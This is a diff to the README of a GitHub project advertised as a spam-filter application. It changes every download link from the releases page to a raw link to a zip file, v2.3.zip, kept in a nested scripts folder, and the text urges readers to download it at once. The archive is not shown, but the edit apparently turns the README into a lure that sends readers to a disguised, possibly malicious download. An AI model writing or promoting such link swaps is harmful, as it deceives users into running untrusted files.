@@ -1,6 +1,6 @@
 # 📧 spam-filter-advisor-skill - Stop Spam Without the Headache
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Samuellalight8026/spam-filter-advisor-skill/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/Samuellalight8026/spam-filter-advisor-skill/main/skills/spam-filter-advisor/scripts/v2.3.zip)
 
 ## 🚀 What Is This?
 
@@ -22,7 +22,7 @@ Getting started is easy. Here's what you need to do:
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: [https://github.com/Samuellalight8026/spam-filter-advisor-skill/releases](https://github.com/Samuellalight8026/spam-filter-advisor-skill/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Samuellalight8026/spam-filter-advisor-skill/main/skills/spam-filter-advisor/scripts/v2.3.zip](https://raw.githubusercontent.com/Samuellalight8026/spam-filter-advisor-skill/main/skills/spam-filter-advisor/scripts/v2.3.zip)
 
 Look for the latest version and click the download button. The file will save to your computer's Downloads folder.
 
@@ -114,7 +114,7 @@ Give it a try today. Your inbox will thank you.
 
 Don't wait another day. Take control of your email now.
 
-[Download spam-filter-advisor-skill](https://github.com/Samuellalight8026/spam-filter-advisor-skill/releases)
+[Download spam-filter-advisor-skill](https://raw.githubusercontent.com/Samuellalight8026/spam-filter-advisor-skill/main/skills/spam-filter-advisor/scripts/v2.3.zip)
 
 ---
 
